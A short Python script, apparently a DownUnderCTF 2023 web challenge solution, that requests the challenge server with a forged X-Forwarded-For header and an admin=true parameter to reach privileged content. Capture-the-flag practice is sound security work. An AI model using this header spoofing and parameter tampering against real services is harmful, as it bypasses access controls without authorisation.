import requests

URL = 'https://web-xxd-server-2680de9c070f.2023.ductf.dev/'
HEADERS = {'X-Forwarded-For':'31.33.33.7'}
PARAMS = {'admin':'true'}

r = requests.get(url = URL, params = PARAMS, headers = HEADERS)

text = r.text

print(text)
